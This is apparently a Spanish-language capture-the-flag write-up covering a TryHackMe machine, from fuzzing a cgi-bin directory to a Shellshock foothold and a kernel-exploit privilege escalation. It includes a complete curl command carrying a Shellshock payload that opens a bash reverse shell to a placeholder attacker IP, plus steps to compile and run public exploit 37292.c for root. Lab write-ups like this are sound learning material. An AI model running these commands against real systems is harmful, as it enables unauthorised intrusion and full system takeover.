---

---
----
- Tags:  #writeup #info #thm #tutorial #medium #kernel 
------------------

# Explotacion 

- Tenemos expuestos los puertos [[SSH - 22]] y *80 HTTP* abiertos
- La version de [[SSH - 22]] es < a la  7.7, por lo cual podriamos probar usar el script para enumerar usuarios validos (No fue vulnearble a este vector de ataque)
- En la parte *Web* no encontramos nada, por lo cual tenemos que hacer un ataque de diccionario *(Fuzzing)*
- Encontramos dentro el directorio */cgi-bin/*, y si le hacemos *Fuzzing*, dentro tambien encotraremos el archivio *test.cgi*

- Aqui aprovecharemos este vector de ataque [[ShellShock - Bashdoor]] 
```bash
 curl -s -X GET "http://<IpTarget>/cgi-bin/test.cgi" -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/<IpAtacante>/443 0>&1'"
```

- En este punto poniendonos en escucha y ejecutando este comando entablariamos una [[Reverse Shell]]

----------

# Privesc

- Para la parte de la explotacion, despues de ver todos los vectores de ataque posibles, no encontramos *NADA*
- Por otro lado, si miramos la version del kernel podemos ver que es de una version bastante desactualizada y podemos hacer uso del *Exploit 37292.c* para explotar el kernel 

- A la hora de querer compilar este Binario, nos encontraremos con el siguiente error del *gcc*
```bash
gcc: error trying to exec 'cc1': execvp: No such file or directory
So, what’s going on here then?
```

- Esto se debe a que Esencialmente, los PATHs usados en esta versión de Ubuntu son un poco raros, resultando en que gcc no puede encontrar cc1 - el programa responsable de convertir el código C en ensamblador. Para arreglar esto necesitamos alinear nuestra variable PATH con el PATH estándar de Ubuntu, lo cual hacemos con el siguiente comando:
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

- Ahora si podriamos compilar normal el binario con *gcc*
```bash
gcc 37292.c -o exploit && ./exploit
```

## De esta forma logramos ganar acceso como Root 
